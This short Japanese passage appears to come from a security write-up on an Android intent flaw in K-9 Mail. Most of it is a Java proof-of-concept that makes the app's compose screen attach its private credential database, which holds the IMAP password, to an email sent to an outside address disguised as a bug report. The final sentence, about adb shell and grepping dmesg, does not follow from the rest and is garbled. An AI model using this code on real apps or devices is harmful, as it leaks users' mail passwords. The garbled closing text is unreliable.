
この例は、K-9 MailのIMAPパスワードを不正に共有することを意図しています。
攻撃者と K-9メールは例としてのみ提供されていますが、
この問題は、現在のリリースで修正されており、より多くのアプリケーションに存在しています。

この攻撃を実行するために必要なコードは次のとおりです。

    Intent i = new Intent();
    i.setComponent(new ComponentName("com.fsck.k9", "com.fsck.k9.activity.MessageCompose"));
    i.setAction(Intent.ACTION_SEND); i.setType("text/plain");
    Uri uri = Uri.parse("file:///data/data/com.fsck.k9/databases/preferences_storage");
    i.putExtra(Intent.EXTRA_STREAM, uri);
    i.putExtra(Intent.EXTRA_TEXT, "Hello World");
    i.putExtra(Intent.EXTRA_EMAIL, new String[]{"support@company.com"});
    i.putExtra(Intent.EXTRA_TEXT, "Dear support team,...");
    i.putExtra(Intent.EXTRA_SUBJECT, "Bug Report");

これは、 `adbシェル`を介してAndroidデバイスに接続し、 `dmesg | grep avc`を実行します。
